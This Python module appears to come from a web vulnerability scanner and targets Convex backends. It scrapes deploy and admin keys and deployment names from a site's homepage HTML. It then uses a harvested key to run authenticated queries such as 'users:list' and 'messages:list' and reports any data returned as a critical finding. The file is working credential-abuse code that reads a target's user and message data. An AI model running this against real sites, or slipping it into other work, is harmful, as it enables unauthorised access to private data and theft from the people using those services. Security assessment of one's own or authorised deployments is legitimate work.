#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Convex deploy key discovery and deployment API abuse."""

from __future__ import annotations

import json
import re
from typing import Any, Dict, List, Tuple

from lib.scanner.http.vibe_secrets_probe import mask_secret

_CONVEX_DEPLOY_RE = re.compile(
    r"(?i)(?:CONVEX_(?:DEPLOY_KEY|ADMIN_KEY)|convexDeployKey)\s*[=:]\s*['\"]([^'\"]+)['\"]",
)
_CONVEX_DEPLOYMENT_RE = re.compile(r"https://([a-z0-9-]+)\.convex\.cloud", re.I)
_CONVEX_URL_CREDS_RE = re.compile(
    r"https://([^:@\s\"']+):([^@\s\"']+)@([a-z0-9-]+)\.convex\.cloud",
    re.I,
)


def discover_convex_credentials(text: str) -> Dict[str, str]:
    creds: Dict[str, str] = {}
    body = text or ""
    for match in _CONVEX_DEPLOY_RE.finditer(body):
        creds["convex_deploy_key"] = match.group(1).strip()
    for match in _CONVEX_DEPLOYMENT_RE.finditer(body):
        creds.setdefault("convex_deployment", match.group(1))
    for match in _CONVEX_URL_CREDS_RE.finditer(body):
        creds["convex_deployment"] = match.group(3)
        creds["convex_deploy_key"] = match.group(2)
    for match in re.finditer(
        r"(?i)(?:NEXT_PUBLIC_|VITE_|REACT_APP_)?CONVEX_URL\s*[=:]\s*['\"]([^'\"]+)['\"]",
        body,
    ):
        url = match.group(1)
        dep = _CONVEX_DEPLOYMENT_RE.search(url)
        if dep:
            creds.setdefault("convex_deployment", dep.group(1))
    return creds


def enum_convex_deployment_info(
    session,
    deployment: str,
    deploy_key: str = "",
    *,
    verify_ssl: bool = True,
) -> Dict[str, Any]:
    base = f"https://{deployment}.convex.cloud"
    headers = {"Accept": "application/json"}
    if deploy_key:
        headers["Authorization"] = f"Convex {deploy_key}"

    for path in ("/version", "/api/version", "/.well-known/convex"):
        try:
            response = session.get(f"{base}{path}", headers=headers, timeout=12, verify=verify_ssl)
        except Exception:
            continue
        if int(getattr(response, "status_code", 0) or 0) != 200:
            continue
        text = str(getattr(response, "text", "") or "")
        return {
            "platform": "convex",
            "ok": True,
            "kind": "convex_deployment_reachable",
            "deployment": deployment,
            "path": path,
            "preview": text[:300],
            "severity": "medium",
        }
    return {"platform": "convex", "ok": False, "detail": "deployment_unreachable"}


def enum_convex_query_surface(
    session,
    deployment: str,
    deploy_key: str,
    *,
    verify_ssl: bool = True,
) -> Dict[str, Any]:
    base = f"https://{deployment}.convex.cloud"
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Authorization": f"Convex {deploy_key}",
    }
    payloads = (
        {"path": "users:list", "args": {}},
        {"path": "messages:list", "args": {}},
        {"path": "internal:listTables", "args": {}},
    )
    for payload in payloads:
        try:
            response = session.post(
                f"{base}/api/query",
                headers=headers,
                json=payload,
                timeout=12,
                verify=verify_ssl,
            )
        except Exception as exc:
            return {"platform": "convex", "ok": False, "detail": str(exc)}
        status = int(getattr(response, "status_code", 0) or 0)
        text = str(getattr(response, "text", "") or "")
        if status == 200 and text.strip().startswith("{"):
            try:
                data = json.loads(text)
            except Exception:
                data = {}
            if "error" not in str(data).lower() or data.get("value") is not None:
                return {
                    "platform": "convex",
                    "ok": True,
                    "kind": "convex_query_with_deploy_key",
                    "deployment": deployment,
                    "path": payload["path"],
                    "preview": text[:400],
                    "severity": "critical",
                }
        if status in (401, 403):
            return {"platform": "convex", "ok": False, "detail": "deploy_key_rejected"}
    return {"platform": "convex", "ok": False, "detail": "no_query_access"}


def enumerate_convex_deploy(
    session,
    homepage_html: str,
    *,
    verify_ssl: bool = True,
    deployment: str = "",
    deploy_key: str = "",
) -> Tuple[List[Dict[str, Any]], Dict[str, str]]:
    creds = discover_convex_credentials(homepage_html or "")
    if deployment:
        creds["convex_deployment"] = deployment
    if deploy_key:
        creds["convex_deploy_key"] = deploy_key

    findings: List[Dict[str, Any]] = []
    dep = creds.get("convex_deployment") or ""
    key = creds.get("convex_deploy_key") or ""
    if not dep:
        return findings, creds

    info = enum_convex_deployment_info(session, dep, key, verify_ssl=verify_ssl)
    if info.get("ok"):
        findings.append(info)

    if key:
        query = enum_convex_query_surface(session, dep, key, verify_ssl=verify_ssl)
        query["key_masked"] = mask_secret(key)
        if query.get("ok"):
            findings.append(query)
        elif not findings:
            findings.append(query)
    return findings, creds


__all__ = [
    "discover_convex_credentials",
    "enumerate_convex_deploy",
    "enum_convex_deployment_info",
    "enum_convex_query_surface",
]
